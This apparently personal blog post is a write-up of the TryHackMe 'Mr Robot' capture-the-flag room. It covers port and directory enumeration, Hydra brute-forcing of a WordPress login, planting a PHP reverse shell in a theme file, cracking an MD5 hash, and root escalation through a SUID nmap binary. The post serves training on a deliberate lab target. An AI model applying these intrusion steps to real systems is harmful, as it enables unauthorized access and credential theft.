---
layout: post
title: Mr Robot CTF
subtitle: TryHackME - Mr Robot CTF
description: Enumerate services, scan TCP/UDP ports, exploit vulnerabilities, and escalate privileges to capture flags.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg
tags:
  - TryHackME
  - Privilege Escalation
  - Find Flags
author: Mustafa Altayeb
date: 2025-10-10 00:00
paginate: true
---

# Mr Robot CTF
[Mr Robot CTF](https://tryhackme.com/room/mrrobot)

![](https://assets.tryhackme.com/additional/imgur/mp5JwKO.png)

## Objectives
1. Enumerate UDP/TCP ports
2. Enumerate HTTP and HTTPS
3. Enumerate WordPress
4. Gain access with a reverse shell
5. Privilege escalation
6. Capture 3 keys

## Reconnaissance

### Nmap Scan
Port scan:
```bash
nmap -p- -sCV -oA MrRobot-Nmap 10.10.186.36
```

**Key Findings**:
- **Port 22**: SSH service, version OpenSSH 8.2p1
- **Port 80**: Apache httpd
- **Port 443**: HTTPS Apache httpd

## Web Enumeration
- Nothing interesting found.

## Gobuster
Gobuster may find special directories.

>|**gobuster dir --url http://10.10.74.251 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt**

**Result**
```js
/images               (Status: 301) [Size: 235] [--> http://10.10.74.251/images/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.74.251/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.74.251/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.74.251/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.74.251/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.74.251/feed/]
/video                (Status: 301) [Size: 234] [--> http://10.10.74.251/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.74.251/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.74.251/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.74.251/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.74.251/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.74.251/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2606]
/css                  (Status: 301) [Size: 232] [--> http://10.10.74.251/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.74.251/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.74.251/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.74.251/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.74.251/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.74.251/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.74.251/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.74.251/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.74.251/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.74.251/wp-admin/]
/phpmyadmin           (Status: 403) [Size: 94]
/0000                 (Status: 301) [Size: 0] [--> http://10.10.74.251/0000/]
/xmlrpc               (Status: 405) [Size: 42]
/IMAGE                (Status: 301) [Size: 0] [--> http://10.10.74.251/IMAGE/]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.74.251/wp-login.php?action=register]
```

**Findings**:
- After visiting pages in the Gobuster results, I found:
  1. `/robots`: Contains a wordlist and key 1 of 3.
     ![](/assets/TryHackMeRoomsImage/MrRobot/image.png)
     Note: Download the file; it's our wordlist to hack the machine.
  2. `key-1-of-3.txt`: Open it to get the key.
- Found WordPress login page.
  ![](/assets/TryHackMeRoomsImage/MrRobot/image1.png)

## Brute Force with Hydra

First, intercept the POST request in Burp Suite. I found the username is sent in `log` and the password in `pwd`. Let's use Hydra.

>|**hydra -L fsocity.dic -p test 10.10.186.36 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30**

Result:
```js
[80][http-post-form] host: 10.10.186.36   login: Elliot   password: test
```

Found username: Elliot.

Use Hydra to brute force the password:
>|**hydra -l Elliot -P fsocity.dic 10.10.186.36 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30**

Result:
```js
[80][http-post-form] host: 10.10.186.36   login: Elliot   password: ER28-0652
```

Now we have credentials to access the site: `username`: Elliot, `password`: ER28-0652

## Initial Access via Reverse Shell

- After logging in, go to Appearance -> Editor -> edit `404.php` to include our reverse shell. I will use [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![](/assets/TryHackMeRoomsImage/MrRobot/image2.png)

Edit IP and port to my VPN IP and port 9999, then click save file.

Start listening:
```js
💻  T4T4R1S  🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
👀  ➜ ~  rlwrap nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.14.109.66] from (UNKNOWN) [10.10.186.36] 41332
Linux ip-10-10-186-36 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 12:19:34 up  1:46,  0 users,  load average: 0.07, 0.05, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

After enumerating the system, I found key 2 in the home directory for a user called `robot` and an MD5 hash file:
```js
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
```

Tried to open key 2 but lacked permission:
```js
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

### Crack MD5 with John
```js
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash
..............
abcdefghijklmnopqrstuvwxyz (?)
1g 0:00:00:00 DONE (2025-10-10 08:14) 100.0g/s 4051Kp/s 4051Kc/s
..............
```

Found password: `abcdefghijklmnopqrstuvwxyz`

After that, switch to the `robot` user to read the key file:
```js
$ su robot
Password: abcdefghijklmnopqrstuvwxyz
```

Make the shell semi-interactive with Python:

>|**python -c 'import pty; pty.spawn("/bin/bash")'**

```js
robot@ip-10-10-186-36:~$ cat key-2-of-3.txt
822c73956184f694...........
```

Now we have 2 keys. I think the last one is in the root directory, so let's proceed with privilege escalation.

## Privilege Escalation

### System Exploration
Find SUID binaries:
```js
robot@ip-10-10-186-36:~$ find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Found `nmap` binary in GTFOBins:
![](/assets/TryHackMeRoomsImage/MrRobot/image3.png)

Let's use it:
```js
robot@ip-10-10-186-36:~$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> whoami
root
```

Find key 3:
```js
cat key-3-of-3.txt
04787ddef27c3dee1ee1.........
```

Finished. Happy Hacking!



<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

Follow me:
- [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
- [X](https://x.com/T4T4R1S)

---

